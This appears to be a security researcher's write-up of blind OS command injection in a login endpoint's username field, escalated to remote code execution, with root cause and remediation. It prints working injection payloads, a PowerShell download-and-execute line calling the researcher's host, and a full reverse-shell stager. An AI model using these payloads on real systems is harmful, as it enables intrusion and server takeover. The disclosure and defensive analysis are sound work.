OS Command Injection to Remote Code Execution

PRE-AUTH SINK // OOB PROOF // ADMIN SHELL

researcher
Naveen Jagadeesan
published
2024-12-10
platform
Windows / Web Application

Pre-auth username check. Boolean JSON response. nginx in front. Somewhere behind that, Windows was concatenating the username field into an OS command — almost certainly a “does this account exist / is it provisioned” helper that should have been a directory API call, not a shell.

This is the path from blind injection to a PowerShell reverse shell running with administrative rights on an asset-management portal.

Target

Centralized asset management web app: create and manage assets, multiple login options (local password, Google SSO, GitHub SSO). I spent time on the unauthenticated edges of login because those endpoints are high traffic, often older, and rarely re-reviewed when SSO gets bolted on.

Interesting call: 

POST /username_exists HTTP/1.1
Host: target.com
Cookie: session cookie: hello
User-Agent: Mozilla/5.0
Content-Type: application/json

{
    "username": "whoami"
}
HTTP/1.1 200 OK
Server: nginx/1.22.1
Content-Type: text/html; charset=utf-8

{
    "success": false
}

Always a boolean-shaped answer. No stdout, no error text, no timing you can trust on a single request. Classic blind / semi-blind command injection territory: you prove execution out-of-band, then escalate payload complexity.

Why username was a suspect

Identity checks sometimes shell out to legacy tools (domain queries, local account utilities, custom provisioning scripts). If the implementation is roughly exec("sometool " + username) or a pipeline with bad quoting, metacharacters in the JSON string become shell syntax.

I treated the field as a Windows cmdline injection surface first (target fingerprint leaned Windows), while still trying cross-platform OOB probes.

Proving execution without a reflection

OOB toolkit for this class of bug:

  • Time sinks (ping with count) when the request blocks on the child process
  • HTTP callbacks (curl / wget / PowerShell download) to an attacker-controlled host
  • DNS callbacks when HTTP egress is filtered (not required here once HTTP worked)

Example probes that landed: 

|ping -c 5 127.0.0.1||

|curl https://thevillagehacker.com/exploit/file.txt||

Pipe / chaining style matched a shell that would run a second command after or beside the intended tool. The curl fetch hit my server — that is ground truth: the worker handling /username_exists can initiate outbound HTTP and run binaries from a payload in username.

At that stage severity is already critical. The rest is operator access.

From callback to shell

Windows + confirmed egress ⇒ stage a PowerShell reverse shell rather than fighting for interactive output in the HTTP response. Hosted a script and triggered download-execute via the same injection point: 

|powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('https://thevillagehacker.com/mypowershell.ps1')"||

Stager contents (TCP reverse shell pattern; adjust host/port per engagement): 

$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 80);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (iex ". { $data } 2>&1" | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush()
};
$client.Close()

Callback connected. Process context on the box was administrative — the web/app pool identity was over-privileged, which turned “RCE as service account” into “RCE as admin” without a separate local exploit.

Shell reference pattern adapted from common public snippets (e.g. community gists such as egre55’s reverse shell examples); the novel part for the report is the sink, not the stager.

Impact

  • Unauthenticated (or pre-auth) remote code execution on the application host
  • Full host compromise under an admin-level app identity
  • Read/modify application data, secrets on disk, further credential material
  • Pivot potential into whatever that host could reach (asset DB, internal APIs, domain resources)

For an asset portal, losing the server is losing the estate map.

Root cause

  1. OS command built from request JSON — username passed into a shell or external process without a strict allowlist of characters / fixed argv array.
  2. No output needed for abuse — boolean wrapper hid errors but did not prevent side effects.
  3. Egress allowed from the app host to the internet (or to attacker infrastructure reachable in the test).
  4. Service runs hot — application identity with admin rights multiplies blast radius of any RCE.

Remediation

  • Delete the shell-out. Resolve usernames with proper APIs / DB queries / IdP calls.
  • If an external binary is unavoidable, use argv arrays with no shell, allowlist ^[A-Za-z0-9._-]+$ (or your real username policy), and hard-fail on mismatch.
  • Run the app pool as a managed service account with least privilege; no local admin for HTTP workers.
  • Egress filter default-deny; alert on unexpected child processes under the w3wp/node/java worker.
  • Add regression tests: metacharacters in username_exists must never spawn cmd / powershell.

Closing

I still fuzz login-adjacent JSON with |, &, backticks, and newlines even when the UI only allows “email format.” The response may stay {"success":false} forever. Your callback server will tell the truth.
